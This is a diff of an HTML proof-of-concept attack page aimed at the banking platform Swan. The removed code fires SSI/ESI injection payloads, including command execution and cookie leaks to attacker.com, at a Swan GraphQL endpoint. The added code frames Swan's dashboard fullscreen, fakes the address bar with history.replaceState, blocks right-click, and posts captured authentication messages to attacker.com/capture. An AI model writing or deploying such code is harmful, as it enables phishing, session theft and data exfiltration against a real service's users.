@@ -1,68 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Swan SSI Injection PoC</title>
+    <title>Swan Iframe Trap PoC</title>
+    <style>
+        #trap-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 9999;
+        }
+    </style>
 </head>
 <body>
-    <h1>Swan SSI/ESI Injection Attack</h1>
-    <button onclick="testSSIInjection()">Test SSI Injection</button>
-    <div id="results"></div>
-
+    <h1>Swan Iframe Trap Attack</h1>
+    <button onclick="activateTrap()">Activate Iframe Trap</button>
+    
     <script>
-        async function testSSIInjection() {
-            const resultsDiv = document.getElementById('results');
+        function activateTrap() {
+            // Create fullscreen iframe
+            const iframe = document.createElement('iframe');
+            iframe.id = 'trap-iframe';
+            iframe.src = 'https://dashboard.swan.io/';
             
-            // SSI/ESI injection payloads
-            const ssiPayloads = [
-                '<!--#echo var="HTTP_COOKIE" -->',
-                '<!--#exec cmd="whoami" -->',
-                '<esi:include src=http://attacker.com/$(HTTP_COOKIE)>',
-                '<!--esi-->test<!--/esi-->',
-                '<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{\'JSESSIONID\'})" />',
-                '<!--esi $(HTTP_COOKIE) -->',
-                '<esi:debug/>'
-            ];
-            
-            for (const payload of ssiPayloads) {
+            // Monitor iframe navigation
+            iframe.onload = function() {
                 try {
-                    // Test in phone number field
-                    const mutation = `
-                        mutation {
-                            startPhoneNumberModification(input:{
-                                oldPhoneNumber:"${payload}",
-                                newPhoneNumber:"+33612345678"
-                            }) {
-                                __typename
-                            }
-                        }
-                    `;
-                    
-                    const response = await fetch('https://api.swan.io/admin-auth/graphql', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ query: mutation })
-                    });
-                    
-                    const data = await response.json();
-                    const responseText = JSON.stringify(data);
-                    
-                    resultsDiv.innerHTML += `
-                        <h3>SSI Payload: ${payload}</h3>
-                        <pre>${responseText}</pre>
-                    `;
-                    
-                    // Check for SSI execution indicators
-                    if (responseText.includes('root') || // Command execution
-                        responseText.includes('HTTP_COOKIE') || // Variable disclosure
-                        response.headers.get('surrogate-control')) { // ESI detection
-                        alert('Potential SSI/ESI vulnerability detected!');
-                    }
-                    
-                } catch (error) {
-                    console.error('SSI test error:', error);
+                    // Try to access iframe content (will fail due to same-origin policy)
+                    console.log('Iframe loaded:', iframe.contentWindow.location.href);
+                } catch (e) {
+                    console.log('Same-origin policy blocking access');
                 }
-            }
+                
+                // Update browser URL to match iframe
+                try {
+                    window.history.replaceState({}, '', 'https://dashboard.swan.io/');
+                } catch (e) {
+                    console.log('Cannot update browser URL');
+                }
+            };
+            
+            // Add to page
+            document.body.appendChild(iframe);
+            
+            // Monitor for navigation events
+            window.addEventListener('message', function(event) {
+                if (event.origin === 'https://dashboard.swan.io') {
+                    console.log('Received message from Swan:', event.data);
+                    
+                    // Try to capture authentication data
+                    if (event.data.type === 'auth-data') {
+                        fetch('https://attacker.com/capture', {
+                            method: 'POST',
+                            body: JSON.stringify(event.data),
+                            mode: 'no-cors'
+                        });
+                    }
+                }
+            });
         }
+        
+        // Disable right-click to prevent easy escape
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        // Monitor mouse leaving iframe (potential reload attempt)
+        document.addEventListener('mouseleave', function() {
+            window.history.replaceState({}, '', 'https://snowgoose.info/?trapped=true');
+        });
     </script>
 </body>
 </html>
